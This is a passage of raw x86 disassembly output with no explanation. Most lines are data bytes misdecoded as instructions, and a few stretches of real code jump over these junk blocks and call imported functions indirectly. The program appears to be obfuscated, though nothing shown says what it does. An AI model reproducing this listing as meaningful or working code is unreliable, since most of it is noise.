  42648f:	or     BYTE PTR [ecx*8-0x73e6762e],bh
  426496:	jmp    0x2a59ad0c
  42649b:	xor    cl,BYTE PTR [ecx-0x72dfdbbc]
  4264a1:	inc    esp
  4264a2:	and    al,0x70
  4264a4:	mov    DWORD PTR [esp+0x28],eax
  4264a8:	jmp    0x426588
  4264ad:	aaa    
  4264ae:	jae    0x426524
  4264b0:	push   edx
  4264b1:	je     0x42650a
  4264b3:	aaa    
  4264b4:	ja     0x4264c0
  4264b6:	(bad)  
  4264b7:	out    0x2,eax
  4264b9:	aam    0x5
  4264bb:	scas   al,BYTE PTR es:[edi]
  4264bc:	pop    edi
  4264bd:	int3   
  4264be:	les    eax,FWORD PTR [ecx]
  4264c0:	add    bl,al
  4264c2:	add    BYTE PTR [eax],al
  4264c4:	add    BYTE PTR [ecx],dl
  4264c6:	scas   al,BYTE PTR es:[edi]
  4264c7:	mov    ds:0xb9717f,eax
  4264cc:	clc    
  4264cd:	mov    ebx,0xd049c44
  4264d2:	inc    ebp
  4264d3:	popa   
  4264d4:	push   esi
  4264d5:	js     0x42650d
  4264d7:	cmp    DWORD PTR [ebx+0x233aaec5],ebp
  4264dd:	pusha  
  4264de:	arpl   WORD PTR [edi+0x3b],bp
  4264e1:	out    dx,eax
  4264e2:	mov    ebx,0x6abd690f
  4264e7:	js     0x426493
  4264e9:	push   ebx
  4264ea:	xor    DWORD PTR [ebx-0x3b4ef41d],eax
  4264f0:	mov    cl,0x14
  4264f2:	daa    
  4264f3:	adc    DWORD PTR [eax-0x32cb7d7d],edi
  4264f9:	jb     0x42656d
  4264fb:	cmp    esp,esi
  4264fd:	fwait
  4264fe:	jo     0x426577
  426500:	ins    BYTE PTR es:[edi],dx
  426501:	lea    ecx,[edx]
  426503:	into   
  426504:	push   ecx
  426505:	sbb    al,0x91
  426507:	loopne 0x42653d
  426509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42650a:	xchg   edx,eax
  42650b:	pop    edx
  42650c:	aas    
  42650d:	mul    DWORD PTR [edx+0x25c3ca60]
  426513:	adc    dh,BYTE PTR [edx+0x4f]
  426516:	call   0xa9e501f4
  42651b:	xchg   BYTE PTR [ecx+ecx*4-0x80],dl
  42651f:	mov    BYTE PTR [ecx],0x43
  426522:	push   ds
  426523:	lahf   
  426524:	adc    cl,0x2c
  426527:	fs xor edx,ebx
  42652a:	adc    bh,ch
  42652c:	xor    BYTE PTR [esp+eax*2+0x53],al
  426530:	addr16 loope 0x426506
  426533:	sbb    ch,ch
  426535:	ins    BYTE PTR es:[edi],dx
  426536:	scas   eax,DWORD PTR es:[edi]
  426537:	add    DWORD PTR [ebx-0x33af33d4],eax
  42653d:	fstp   TBYTE PTR [ecx-0x12b67fb6]
  426543:	jecxz  0x426533
  426545:	pop    ebp
  426546:	xchg   BYTE PTR [edx],bl
  426548:	cdq    
  426549:	push   ebp
  42654a:	jmp    0x80aa9008
  42654f:	sub    eax,DWORD PTR [ebp+0x1c]
  426552:	xor    al,0x22
  426554:	mov    bh,0x7d
  426556:	lock jmp 0x4265b0
  426559:	rcr    DWORD PTR [ebx-0x565823df],0x72
  426560:	mov    eax,ds:0xd14c761c
  426565:	idiv   DWORD PTR [edx-0x18]
  426568:	pop    edi
  426569:	adc    ebx,DWORD PTR [ebp-0x21ca7bb9]
  42656f:	fxch   st(5)
  426571:	push   edi
  426572:	adc    al,0xa4
  426574:	rcl    DWORD PTR [ecx-0x7895f9d8],cl
  42657a:	xchg   DWORD PTR [ebp+0x1bd80ed4],edi
  426580:	pop    esi
  426581:	xchg   cl,ah
  426583:	iret   
  426584:	repnz cwde 
  426586:	jbe    0x4265a0
  426588:	mov    eax,ds:0x42f1b4
  42658d:	mov    esi,DWORD PTR ds:0x42e028
  426593:	mov    edi,DWORD PTR ds:0x42e02c
  426599:	sub    esi,edi
  42659b:	sub    esi,DWORD PTR [esi+edi*1]
  42659e:	jmp    0x42667e
  4265a3:	add    DWORD PTR [ecx+0x1c],ebx
  4265a6:	ss pop esp
  4265a8:	ja     0x4265d5
  4265aa:	jg     0x4265fa
  4265ac:	adc    ebx,DWORD PTR [edx+0x5f]
  4265af:	push   0xffffffa1
  4265b1:	sbb    al,0xa1
  4265b3:	pop    ebp
  4265b5:	add    DWORD PTR [eax],eax
  4265b7:	ret    
  4265b8:	add    BYTE PTR [eax],al
  4265ba:	add    BYTE PTR ds:0xe09c2631,ah
  4265c0:	inc    ebx
  4265c1:	into   
  4265c2:	cmp    BYTE PTR [ecx],bl
  4265c4:	xchg   ebx,eax
  4265c5:	aam    0x8b
  4265c7:	sbb    eax,0xa030fe6d
  4265cc:	mov    es,WORD PTR [ebx-0x42]
  4265cf:	mov    dh,0x9f
  4265d1:	in     eax,0xb2
  4265d3:	mov    esp,DWORD PTR [esi-0x1]
  4265d6:	sub    al,0x92
  4265d8:	pusha  
  4265d9:	bound  esi,QWORD PTR [edi]
  4265db:	out    dx,eax
  4265dc:	imul   edi,DWORD PTR [esi],0x1ed408c8
  4265e2:	outs   dx,DWORD PTR ds:[esi]
  4265e3:	mov    esp,0x3c5e51ea
  4265e8:	pop    edx
  4265e9:	jbe    0x4265af
  4265eb:	test   eax,0x812f5d71
  4265f0:	loopne 0x426591
  4265f2:	sub    edx,DWORD PTR [ecx+0x4529b8a4]
  4265f8:	dec    ebp
  4265f9:	jnp    0x42658c
  4265fb:	stc    
  4265fc:	cs repz or eax,0xec2c3b5
  426603:	mov    dl,0x8a
  426605:	dec    esi
  426606:	fist   DWORD PTR [ebp+0x240f645f]
  42660c:	aad    0x52
  42660e:	xor    BYTE PTR [edx+0x77],al
  426611:	push   ds
  426612:	mov    edi,0x308ace66
  426617:	retf   0xc004
  42661a:	xchg   edi,eax
  42661b:	repnz mov edx,0xebcc25c7
  426621:	mov    esi,0x9b29a990
  426626:	out    dx,al
  426627:	push   0xffffffe1
  426629:	add    BYTE PTR ds:0x68d32f8e,cl
  42662f:	retf   
  426630:	mov    ebp,cs
  426632:	jle    0x4265ef
  426634:	mov    eax,0xee4e2f91
  426639:	cmp    eax,0x8542289d
  42663e:	and    BYTE PTR [ecx+0x7a05a61f],cl
  426644:	mov    al,ds:0xe1f2335d
  426649:	js     0x426629
  42664b:	(bad)  
  42664c:	(bad)  
  42664e:	mov    bh,BYTE PTR [ebp+eiz*2-0x4b0b3ca1]
  426655:	hlt    
  426656:	push   edx
  426657:	inc    edx
  426658:	mov    ch,0x60
  42665a:	lods   al,BYTE PTR ds:[esi]
  42665b:	mov    al,0xe6
  42665d:	sahf   
  42665e:	jbe    0x426686
  426660:	outs   dx,BYTE PTR gs:[esi]
  426662:	sub    BYTE PTR [ebx+0x62f5f52b],bl
  426668:	mov    ecx,0xb50a74e2
  42666d:	add    ebx,DWORD PTR [edi+ebx*2-0x1f3b35ad]
  426674:	cs in  al,0xb7
  426677:	cmp    eax,eax
  426679:	pop    ecx
  42667a:	(bad)  
  42667b:	xchg   ebx,eax
  42667c:	or     dh,BYTE PTR [ebx-0x75]
  42667f:	or     al,0x1
  426682:	add    BYTE PTR [eax],al
  426684:	mov    eax,DWORD PTR [eax]
  426686:	lea    ecx,[eax-0x3cf87511]
  42668c:	cmp    DWORD PTR ds:0x42f5d4,0x0
  426693:	ja     0x4266ca
  426699:	xor    edi,esi
  42669b:	jmp    0x4266ca
  4266a0:	push   0x20da
  4266a5:	push   0x42f644
  4266aa:	push   DWORD PTR [ebp-0x20]
  4266ad:	push   0x42f5bc
  4266b2:	push   0x196f
  4266b7:	push   0x1d7e
  4266bc:	push   DWORD PTR [ebp-0x28]
  4266bf:	push   0x26d6
  4266c4:	call   DWORD PTR ds:0x4387ec
  4266ca:	add    eax,0xffff8aef
  4266cf:	shl    eax,0x10
  4266d2:	xor    ecx,0x78e20000
  4266d8:	jmp    0x4267b8
  4266dd:	cmp    BYTE PTR [ebx+0x23],bh
  4266e0:	mov    fs,WORD PTR [ebx-0x22]
  4266e3:	mov    ebp,0x1e355eff
  4266e8:	fisubr DWORD PTR [bx+di+0x67aa]
  4266ed:	push   edx
  4266ee:	mov    BYTE PTR [ecx],0x0
  4266f1:	ret    
  4266f2:	add    BYTE PTR [eax],al
  4266f4:	add    BYTE PTR [ebp-0x472968db],dl
  4266fa:	add    BYTE PTR [esi],bl
  4266fc:	push   0x78b47539
  426701:	into   
  426702:	adc    eax,0xbd360c8e
  426707:	retf   0xa47
  42670a:	cld    
  42670b:	jle    0x42677e
  42670d:	in     al,0x2
  42670f:	in     al,dx
  426710:	jecxz  0x4266b3
  426712:	pop    ebx
  426713:	iret   
  426714:	xchg   edi,eax
  426715:	mov    DWORD PTR [ebx],eax
  426717:	dec    ebp
  426718:	add    BYTE PTR [ecx],bl
  42671a:	pop    esi
  42671b:	inc    esi
  42671c:	jnp    0x42678b
  42671e:	or     bh,BYTE PTR [eax+eiz*4+0x6cd16ce9]
  426725:	jae    0x4266c8
  426727:	leave  
  426728:	stc    
  426729:	add    bl,bl
  42672b:	shl    DWORD PTR [eax+0x19],cl
  42672e:	pop    ecx
  42672f:	retf   
  426730:	and    esp,eax
  426732:	push   0x69661745
  426737:	jle    0x42675c
  426739:	stc    
  42673a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42673b:	jge    0x4266f5
  42673d:	test   al,0xdd
  42673f:	cmp    cl,cl
  426741:	sub    al,0x5f
  426743:	loope  0x42675c
  426745:	fwait
  426746:	int    0x7f
  426748:	iret   
  426749:	push   edx
  42674a:	dec    esi
  42674b:	xor    dh,BYTE PTR [edi+ebx*2+0x49]
  42674f:	jno    0x426778
  426751:	mov    al,dh
  426753:	cmp    bh,BYTE PTR [eax]
  426755:	pop    ebp
  426756:	call   0x81cd:0xd476a67a
  42675d:	repnz mov ebx,DWORD PTR [ecx]
  426760:	clc    
  426761:	push   ss
  426762:	(bad)  
  426763:	je     0x426728
  426765:	inc    DWORD PTR [ecx+0x5a]
  426768:	push   0x75
  42676a:	neg    DWORD PTR [ebp-0x74]
  42676d:	in     al,dx
  42676e:	cmp    bh,BYTE PTR [ebx-0x71]
  426771:	jg     0x4267dc
  426773:	jnp    0x4267e7
  426775:	pop    edx
  426776:	mov    cl,0xb
  426778:	call   FWORD PTR [ebp+0x75]
  42677b:	xchg   edx,eax
  42677c:	mov    bl,0xfd
  42677e:	das    
  42677f:	cmp    DWORD PTR [ebx+ecx*8],edi
  426782:	fbld   TBYTE PTR [ebp-0x26]
  426785:	cs pop esi
  426787:	or     esp,eax
  426789:	jp     0x4267e4
  42678b:	push   ecx
  42678c:	fimul  WORD PTR [esi+edi*1]
  42678f:	cld    
  426790:	shr    ebx,0x36
  426793:	fcomp  DWORD PTR [edx+0x5c]
  426796:	repnz cdq 
  426798:	adc    dl,BYTE PTR [edi+0x52205d89]
  42679e:	inc    ecx
  42679f:	adc    DWORD PTR [eax+ebx*2+0x23],edi
  4267a3:	push   ds
  4267a4:	dec    ebx
  4267a5:	fstp   QWORD PTR [esi-0x56]
  4267a8:	aas    
  4267a9:	pop    es
  4267aa:	jmp    0x1e3a91d2
  4267af:	stc    
  4267b0:	nop
  4267b1:	sbb    dh,dl
  4267b3:	cli    
  4267b4:	pop    ds
  4267b5:	add    DWORD PTR [edx+ebx*8-0x36ffffcb],ecx
  4267bc:	pop    ecx
  4267bd:	jmp    0x42689d
  4267c2:	inc    esp
  4267c3:	mov    ah,0x24
  4267c5:	jns    0x4267bb
  4267c7:	stc    
  4267c8:	pop    ebp
  4267c9:	mov    ebp,0xa1871ba6
  4267ce:	push   es
  4267cf:	mov    WORD PTR [ecx],cs
  4267d1:	ins    DWORD PTR es:[edi],dx
  4267d2:	adc    eax,0xc30001c7
  4267d7:	add    BYTE PTR [eax],al
  4267d9:	add    BYTE PTR [ecx+0x1b440421],bh
  4267df:	pop    edx
  4267e0:	and    al,BYTE PTR [ecx+0x412c25de]
  4267e6:	add    eax,0x888e6919
  4267eb:	sbb    eax,0x78f781be
  4267f0:	add    ch,BYTE PTR [ebx-0x2c]
  4267f3:	ins    BYTE PTR es:[edi],dx
  4267f4:	or     eax,0xab337b86
  4267f9:	mov    cl,0xcf
  4267fb:	mov    cl,0xf0
  4267fd:	jle    0x426819
  4267ff:	mov    al,0x2b
  426801:	inc    esi
  426802:	fist   DWORD PTR [esi+eax*8+0x4e18c8dc]
  426809:	mov    BYTE PTR [ebx],dh
  42680b:	mov    ecx,DWORD PTR [ebp+ebp*2+0x77c2e2ab]
  426812:	sub    al,0x71
  426814:	adc    al,0x37
  426816:	dec    esp
  426817:	mov    dl,0x12
  426819:	or     al,0x21
  42681b:	cwde   
  42681c:	out    0xbf,eax
  42681e:	dec    ebp
  42681f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426820:	shl    BYTE PTR [ecx+ebp*1+0x1ad1adae],0x15
  426828:	hlt    
  426829:	lds    esp,FWORD PTR [esi-0x53]
  42682c:	std    
  42682d:	(bad)  
  42682e:	cld    
  42682f:	cmp    ecx,edx
  426831:	jae    0x42681e
  426833:	pop    ebx
  426834:	add    al,0xf5
  426836:	imul   eax,DWORD PTR [esi],0x1d
  426839:	jnp    0x42683a
  42683b:	stos   DWORD PTR es:[edi],eax
  42683c:	call   0xc8ec:0x4d078035
  426843:	mov    edi,0xc3a51b0e
  426848:	das    
  426849:	mov    eax,0xcbfda34
  42684e:	aad    0x73
  426850:	inc    ebp
  426851:	mov    ss,WORD PTR [edx+0x47c8bdd9]
  426857:	fist   DWORD PTR [ecx-0x40]
  42685a:	clc    
  42685b:	xchg   BYTE PTR [edi],dh
  42685d:	leave  
  42685e:	jnp    0x4267e7
  426860:	push   ecx
  426861:	fwait
  426862:	mov    DWORD PTR [ebx],esp
  426864:	(bad)  
  426865:	mov    edx,0x795716e8
  42686a:	mov    al,ds:0xbd5bef29
  42686f:	dec    eax
  426870:	sbb    eax,0xf62a7bfb
  426875:	sbb    bh,BYTE PTR [ecx+0x66add0a0]
  42687b:	out    0xa5,al
  42687d:	je     0x4268f4
  42687f:	(bad)  
  426880:	fisttp QWORD PTR [eax-0x26079a4e]
  426886:	mov    ds:0xb091fa55,al
  42688b:	pushf  
  42688c:	jecxz  0x426843
  42688e:	in     al,0x71
  426890:	xchg   edx,eax
  426891:	push   ss
  426892:	sbb    al,0xb0
  426894:	or     eax,0x16add1b8
  426899:	and    BYTE PTR [ebx-0x163e29e0],0x10
  4268a0:	or     ecx,eax
  4268a2:	cmp    DWORD PTR ds:0x42f638,0x0
  4268a9:	jl     0x4268df
  4268af:	movzx  eax,BYTE PTR ds:0x42f5b8
  4268b6:	adc    DWORD PTR ds:0x42f584,eax
  4268bc:	jmp    0x4268df
  4268c1:	push   DWORD PTR [ebp-0x18]
  4268c4:	push   0x42f534
  4268c9:	push   0x42a5d9
  4268ce:	push   DWORD PTR [ebp-0x18]
  4268d1:	push   0x3ed3
  4268d6:	push   DWORD PTR [ebp-0x10]
  4268d9:	call   DWORD PTR ds:0x4387f0
  4268df:	mov    eax,DWORD PTR [esp+0x28]
  4268e3:	jmp    0x4269c3
  4268e8:	fnstcw WORD PTR [edi-0x528156e6]
  4268ee:	sti    
  4268ef:	inc    eax
  4268f1:	and    eax,0xe2a3da74
  4268f6:	outs   dx,DWORD PTR ds:[esi]
  4268f7:	in     al,0xd8
  4268f9:	mov    DWORD PTR [ecx],0xc300
  4268ff:	add    BYTE PTR [eax+0x7a],bl
  426902:	or     al,0xf2
  426904:	mov    eax,0x9b59670c
  426909:	sar    BYTE PTR [esi],cl
  42690b:	fs mov edi,0x7b59fdb0
  426911:	lock jle 0x4268b7
  426914:	retf   0x92b7
  426917:	daa    
  426918:	test   BYTE PTR [edx-0x7077c957],dh
  42691e:	or     ecx,DWORD PTR [ebp+0x285ad6d6]
  426924:	in     al,0x3e
  426926:	test   BYTE PTR [edi],ah
  426928:	ins    BYTE PTR es:[edi],dx
  426929:	pop    ds
  42692a:	out    0x8b,eax
  42692c:	ja     0x426959
  42692e:	repz push 0xffffffb8
  426931:	lods   eax,DWORD PTR ds:[esi]
  426932:	pop    esi
  426933:	loope  0x4268df
  426935:	and    eax,0xa7ae970d
  42693a:	push   esp
  42693b:	or     esi,DWORD PTR [esi]
  42693d:	push   eax
  42693e:	fimul  WORD PTR [ecx-0x7b]
  426941:	pop    edx
  426942:	mov    ds:0xab2b77ef,al
  426947:	xor    ebp,ebp
  426949:	test   al,0xbd
  42694b:	jne    0x42694e
  42694d:	adc    DWORD PTR ds:0xdff3ec3c,esp
  426953:	stos   BYTE PTR es:[edi],al
  426954:	mov    al,ds:0xe91f5cd8
  426959:	mov    cl,bl
  42695b:	mov    al,0x3a
  42695d:	sub    DWORD PTR [ecx+edi*1],edi
  426960:	outs   dx,DWORD PTR ds:[esi]
  426961:	adc    dh,BYTE PTR [edi-0x4e9dc701]
  426967:	ficomp WORD PTR [eax]
  426969:	pop    esi
  42696a:	arpl   WORD PTR [eax+0x6851e873],dx
  426970:	mov    bh,0xab
  426972:	jecxz  0x426965
  426974:	pop    ebx
  426975:	sub    bl,BYTE PTR [esi+0x3d]
  426978:	fcomp  QWORD PTR [ebx+0x36]
  42697b:	cli    
  42697c:	pusha  
  42697d:	test   al,0x8a
  42697f:	push   0x78
  426981:	gs in  eax,0x29
  426984:	sub    dl,BYTE PTR [ecx+0x3]
  426987:	shl    dl,1
  426989:	xor    ebx,DWORD PTR [eax-0x508985b3]
  42698f:	xor    DWORD PTR [edi],esi
  426991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426992:	and    BYTE PTR [ebp-0x403149e9],al
  426998:	mov    ecx,0x50a62757
  42699d:	fild   WORD PTR ds:0x2c414081
  4269a3:	pop    esp
  4269a4:	inc    edi
  4269a5:	cmp    ecx,ecx
  4269a7:	mov    al,ds:0x486d112d
  4269ac:	sub    DWORD PTR [edx-0x1b6ffefc],ebp
  4269b2:	mov    al,ds:0xab1f7c17
  4269b7:	mov    eax,0xa95a50ab
  4269bc:	fdivp  st(4),st
  4269be:	dec    esi
  4269bf:	cwde   
  4269c0:	push   eax
  4269c1:	mov    al,0x17
  4269c3:	sub    ecx,0x3cf87511
  4269c9:	jmp    0x426aa9
  4269ce:	cmc    
  4269cf:	ret    
  4269d0:	sub    BYTE PTR [esi+edi*1],cl
  4269d3:	out    dx,eax
  4269d4:	cmc    
  4269d5:	sti    
  4269d6:	xchg   esi,eax
  4269d7:	sar    BYTE PTR [edx+0x190963c3],1
  4269dd:	mov    ebx,0x1c89b
  4269e2:	ret    
  4269e3:	add    BYTE PTR [eax],al
  4269e5:	add    BYTE PTR [ebx+ecx*8+0xcc66743],dh
  4269ec:	icebp  
  4269ed:	aam    0xea
  4269ef:	inc    edx
  4269f0:	scas   al,BYTE PTR es:[edi]
  4269f1:	movaps XMMWORD PTR [edi+0x53],xmm1
  4269f5:	addr16 aaa 
  4269f7:	xchg   edx,eax
  4269f8:	push   ss
  4269f9:	in     al,dx
  4269fa:	es idiv ah
  4269fd:	das    
  4269fe:	mov    DWORD PTR [edi-0x2a82f169],esp
  426a04:	inc    edx
  426a05:	inc    ebp
  426a06:	xor    edx,DWORD PTR [ebp+ebx*2+0x3641a4aa]
  426a0d:	mov    bl,0x95
  426a0f:	inc    edi
  426a10:	xor    ah,BYTE PTR [eax-0x41]
  426a13:	or     eax,0xe85f1f42
  426a18:	in     al,0x28
  426a1a:	dec    ecx
  426a1b:	into   
  426a1c:	mov    bh,0x46
  426a1e:	cli    
  426a1f:	xchg   ebp,eax
  426a20:	fld    TBYTE PTR fs:[eax]
  426a23:	add    ebx,0x8de8d06d
  426a29:	mov    ah,BYTE PTR [edi]
  426a2b:	jle    0x426a24
  426a2d:	popa   
  426a2e:	int    0x91
  426a30:	(bad)
  426a34:	loop   0x426a7a
  426a36:	fwait
  426a37:	hlt    
  426a38:	aad    0xcc
  426a3a:	dec    eax
  426a3b:	sbb    DWORD PTR [ebx+0x1c71f62e],edi
  426a41:	hlt    
  426a42:	jp     0x4269f2
  426a44:	stos   BYTE PTR es:[edi],al
  426a45:	push   ss
  426a46:	dec    ebp
  426a47:	dec    ebp
  426a48:	mov    dh,0x98
  426a4a:	jle    0x426a62
  426a4c:	inc    edx
  426a4d:	pop    ecx
  426a4e:	fisub  DWORD PTR [edx]
  426a50:	xchg   ebx,eax
  426a51:	ficom  WORD PTR [ebp-0x2e]
  426a54:	push   0xa8267a1c
  426a59:	inc    ebp
  426a5a:	pushf  
  426a5b:	sub    ebp,DWORD PTR [edi+0x3b]
  426a5e:	int3   
  426a5f:	out    0xf4,eax
  426a61:	mov    bh,BYTE PTR [ecx]
  426a63:	pushf  
  426a64:	sbb    dh,0x16
  426a67:	push   es
  426a68:	and    ah,BYTE PTR [eax-0x19]
  426a6b:	lods   eax,DWORD PTR ds:[esi]
  426a6c:	mov    BYTE PTR [esi-0x1b8027f5],0xbb
  426a73:	nop
  426a74:	int3   
  426a75:	popa   
  426a76:	ins    BYTE PTR es:[edi],dx
  426a77:	xor    eax,0xa4354e1
  426a7c:	in     eax,0x57
  426a7e:	inc    ecx
  426a7f:	sub    DWORD PTR [esi+0x74464fd1],ecx
  426a85:	xlat   BYTE PTR ds:[ebx]
  426a86:	call   DWORD PTR [ebp-0x4c]
  426a89:	into   
  426a8a:	out    0x2d,al
  426a8c:	adc    ecx,DWORD PTR [eax+0x1cfac134]
  426a92:	pop    esi
  426a93:	outs   dx,DWORD PTR ds:[esi]
  426a94:	test   eax,0x2cbf5654
  426a99:	xchg   esi,eax
  426a9a:	add    bl,ah
  426a9c:	hlt    
  426a9d:	pushf  
  426a9e:	aam    0xfb
  426aa0:	test   BYTE PTR [esi-0x3f],al
  426aa3:	cmp    BYTE PTR [edx],bl
  426aa5:	rcr    BYTE PTR [ebx-0x50],0x69
  426aa9:	mov    DWORD PTR [eax],ecx
  426aab:	jmp    0x426b8b
  426ab0:	sbb    bl,ch
  426ab2:	jmp    0x7cda664c
  426ab7:	out    dx,eax
  426ab8:	dec    ebx
  426ab9:	or     edi,DWORD PTR [esi+0x5f]
  426abc:	out    0x36,al
  426abe:	jmp    0x20bc958
  426ac3:	add    bl,al
  426ac5:	add    BYTE PTR [eax],al
  426ac7:	add    BYTE PTR [edi-0x63],ah
  426aca:	es dec edi
  426acc:	in     al,dx
  426acd:	xlat   BYTE PTR ds:[bx]
  426acf:	retf   
  426ad0:	in     al,0xe4
  426ad2:	jne    0x426aee
  426ad4:	icebp  
  426ad5:	xor    bl,ah
  426ad7:	movntps XMMWORD PTR [esi+0x1cee2117],xmm3
  426ade:	(bad)  
  426adf:	(bad)  
  426ae0:	hlt    
  426ae1:	mov    dh,0xdd
  426ae3:	(bad)  
  426ae4:	pop    edi
  426ae5:	xchg   ecx,eax
  426ae6:	pop    esi
  426ae7:	addr16 push ds
  426ae9:	push   0x35
  426aeb:	jo     0x426af0
  426aed:	push   esi
  426aee:	and    al,0xb9
  426af0:	xchg   ebp,eax
  426af1:	dec    ebp
  426af2:	xor    bh,BYTE PTR [ebx]
  426af4:	popa   
  426af5:	cmp    ah,BYTE PTR [ebp-0x1fcb7b03]
  426afb:	iret   
  426afc:	xchg   BYTE PTR [eax+0x3b8c8d68],al
  426b02:	inc    DWORD PTR [edi-0x7bfabd1b]
  426b08:	and    dl,dl
  426b0a:	rcl    BYTE PTR [edx+0x5b],1
  426b0d:	jp     0x426ac6
  426b0f:	clc    
  426b10:	test   eax,0x77f8ea5b
  426b15:	dec    ebp
  426b16:	(bad)  
  426b17:	ins    DWORD PTR es:[edi],dx
  426b18:	sub    eax,0x102595db
  426b1d:	shl    BYTE PTR [edi],1
  426b1f:	enter  0xb535,0x72
  426b23:	sub    edi,DWORD PTR ds:0x18b94780
  426b29:	dec    edi
  426b2a:	push   es
  426b2b:	push   edx
  426b2c:	pop    ds
  426b2d:	add    dh,ah
  426b2f:	mov    al,ds:0xeb00ac98
  426b34:	push   edi
  426b35:	inc    esi
  426b36:	xlat   BYTE PTR ds:[ebx]
  426b37:	sub    eax,0x7a0735a2
  426b3c:	pop    ecx
  426b3d:	(bad)  
  426b3e:	(bad)  
  426b3f:	pop    edx
  426b40:	mov    ch,cl
  426b42:	sub    edx,DWORD PTR [esp+edx*1]
  426b45:	in     al,dx
  426b46:	jae    0x426b24
  426b48:	cld    
  426b49:	push   edi
  426b4a:	cs ins BYTE PTR es:[edi],dx
  426b4c:	mov    fs,WORD PTR [ebx]
  426b4e:	inc    ebx
  426b4f:	xor    DWORD PTR [edx],ecx
  426b51:	test   al,0x80
  426b53:	add    al,0xd1
  426b55:	ret    
  426b56:	into   
  426b57:	dec    esi
  426b58:	loope  0x426b22
  426b5a:	bound  ebp,QWORD PTR [esi-0x302e3ccb]
  426b60:	int    0xc3
  426b62:	mov    BYTE PTR [ebx+0x7b],ch
  426b65:	fs jo  0x426b75
  426b68:	adc    al,0x4f
  426b6a:	push   0x64517036
  426b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b70:	out    dx,eax
  426b71:	test   eax,0x5693f83e
  426b76:	inc    ebx
  426b77:	ds loop 0x426be9
  426b7a:	mov    ebx,0x3652905e
  426b7f:	sti    
  426b80:	jae    0x426b4f
  426b82:	shl    BYTE PTR [edi],cl
  426b84:	outs   dx,DWORD PTR ds:[esi]
  426b85:	adc    esp,ebp
  426b87:	daa    
  426b88:	push   edx
  426b89:	push   eax
  426b8a:	call   0x3066b056
  426b8f:	hlt    
  426b90:	cmp    eax,0x44c70000
  426b95:	and    al,0x28
  426b97:	sbb    BYTE PTR [ecx],al
  426b99:	add    BYTE PTR [eax],al
  426b9b:	xor    ecx,ecx
  426b9d:	xor    ecx,DWORD PTR ds:0x42f698
  426ba3:	mov    eax,ds:0x42c01c
  426ba8:	sub    ecx,eax
  426baa:	sub    ecx,DWORD PTR [ecx+eax*1]
  426bad:	mov    eax,DWORD PTR [esp+0x28]
  426bb1:	cmp    DWORD PTR ds:0x42f538,0x0
  426bb8:	jg     0x426bce
  426bbe:	sbb    ecx,esi
  426bc0:	jmp    0x426bce
  426bc5:	push   DWORD PTR [ebp-0xc]
  426bc8:	call   DWORD PTR ds:0x4387f4
  426bce:	mov    ecx,DWORD PTR [esp+0x30]
  426bd2:	xor    eax,0xb73
  426bd7:	sub    eax,ecx
  426bd9:	mov    DWORD PTR [esp+0x18],eax
  426bdd:	mov    DWORD PTR [esp+0x40],0x9
  426be5:	mov    DWORD PTR [esp+0x3c],0x6952
  426bed:	xor    edi,0x291c
  426bf3:	mov    DWORD PTR [esp+0x30],0x7b24
  426bfb:	add    DWORD PTR ds:0x42f654,0x4400
  426c05:	jmp    0x426ce5
  426c0a:	adc    BYTE PTR [edi],bh
  426c0c:	pop    ebp
  426c0d:	mov    dl,0x7f
  426c0f:	repnz (bad) 
  426c11:	mov    edi,0xc36910be
  426c16:	or     eax,DWORD PTR [edi-0x4b]
  426c19:	xor    esp,DWORD PTR [ecx]
  426c1b:	retf   0x1
  426c1e:	ret    
  426c1f:	add    BYTE PTR [eax],al
  426c21:	add    BYTE PTR [eax],dh
  426c23:	int    0x6f
  426c25:	jno    0x426be4
  426c27:	inc    esp
  426c28:	nop
  426c29:	ins    DWORD PTR es:[edi],dx
  426c2a:	sbb    dh,BYTE PTR [ecx]
  426c2c:	mov    edx,0xeafb9f28
  426c31:	pusha  
  426c32:	cmp    eax,0xf52c64c6
  426c37:	jno    0x426ca7
  426c39:	xor    eax,0x178349be
  426c3e:	stos   BYTE PTR es:[edi],al
  426c3f:	inc    edi
  426c40:	stc    
  426c41:	xchg   ecx,eax
  426c42:	jnp    0x426c3f
  426c44:	jb     0x426c6a
  426c46:	fist   DWORD PTR [ebp-0x40]
  426c49:	push   edx
  426c4a:	les    ebp,FWORD PTR [ebx+0x4e]
  426c4d:	in     eax,0x7b
  426c4f:	lock icebp 
  426c51:	std    
  426c52:	arpl   WORD PTR [ecx],bp
  426c54:	popf   
  426c55:	dec    ecx
  426c56:	bound  ebp,QWORD PTR [eax-0x44]
  426c59:	neg    DWORD PTR [ebx+0xf]
  426c5c:	or     ch,BYTE PTR [ecx]
  426c5e:	cdq    
  426c5f:	mov    edi,0xe47a4c5a
  426c64:	jmp    0x426c3e
  426c66:	or     dh,BYTE PTR ds:0x8bed3a3
  426c6c:	mov    fs,WORD PTR [edi+0x55c9f06c]
  426c72:	fadd   QWORD PTR [edx+edx*2-0x2e]
  426c76:	imul   esi,esp,0xffffffe8
  426c79:	inc    edx
  426c7a:	cmp    al,0x16
  426c7c:	xchg   esp,eax
  426c7d:	jne    0x426cec
  426c7f:	fcom   QWORD PTR [ebp+0x2d]
  426c82:	mov    ?,WORD PTR [edi]
  426c84:	clc    
  426c85:	push   esi
  426c86:	xor    DWORD PTR [edi],ecx
  426c88:	pop    edx
  426c89:	in     al,0x3c
  426c8b:	xchg   BYTE PTR [ebx-0x79],ah
  426c8e:	jg     0x426cb6
  426c90:	(bad)
  426c94:	dec    ebx
  426c95:	test   BYTE PTR [eax],ch
  426c97:	sahf   
  426c98:	rol    edx,cl
  426c9a:	icebp  
  426c9b:	push   ds
  426c9c:	addr16 in al,dx
  426c9e:	pop    esi
  426c9f:	outs   dx,DWORD PTR ds:[esi]
  426ca0:	add    BYTE PTR [ebx-0x7],0x3c
  426ca4:	leave  
  426ca5:	loopne 0x426c4f
  426ca7:	loop   0x426d1c
  426ca9:	test   al,0x60
  426cab:	fimul  WORD PTR [edi+0x19]
  426cae:	xchg   ecx,eax
  426caf:	leave  
  426cb0:	mov    BYTE PTR [ebx],ah
  426cb2:	nop
  426cb3:	fiadd  DWORD PTR [edi+0x17]
  426cb6:	imul   ebp,DWORD PTR [edx+ecx*2-0x5a739d6a],0xffffff98
